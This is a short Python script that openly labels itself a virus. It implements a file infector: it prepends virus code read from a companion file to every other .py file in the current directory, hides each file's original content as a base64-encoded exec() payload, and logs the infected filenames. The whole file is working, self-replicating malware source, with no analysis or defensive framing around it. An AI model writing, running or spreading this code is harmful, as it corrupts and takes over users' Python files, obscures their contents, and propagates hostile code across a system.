import os
import platform
import base64
import datetime

VIRUS_START = "# === VIRUS START ==="
VIRUS_END = "# === VIRUS END ==="
VIRUS_BODY_FILE = "virus_body.py"

def get_virus_code():
    code = []
    in_virus = False
    with open(VIRUS_BODY_FILE, "r") as f:
        for line in f:
            if line.strip() == VIRUS_START:
                in_virus = True
            if in_virus:
                code.append(line)
            if line.strip() == VIRUS_END:
                break
    return code

def infect_files(virus_code):
    infected_files = []
    for file in os.listdir():
        if (
            file.endswith(".py") 
            and not file.startswith("virus")
            and file != os.path.basename(__file__)
        ):
            with open(file, "r") as f:
                content = f.read()

            if VIRUS_START in content:
                continue

            encoded = base64.b64encode(content.encode()).decode()
            payload = f"\n# === ENCRYPTED ORIGINAL ===\n"
            payload += f"import base64\nexec(base64.b64decode('{encoded}'))\n"

            with open(file, "w") as f:
                f.writelines(virus_code)
                f.write("\n")
                f.write(payload)

            infected_files.append(file)  # ✅ track infected file

    return infected_files  # ✅ return result

def log_activity(infected_files=None):
    if not infected_files:
        return  # Nothing to log

    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("virus_log.txt", "a") as log:
        for file in infected_files:
            log.write(f"Infected: {timestamp} | {file}\n")

if __name__ == "__main__":
    code = get_virus_code()
    infected_files = infect_files(code)
    log_activity(infected_files)
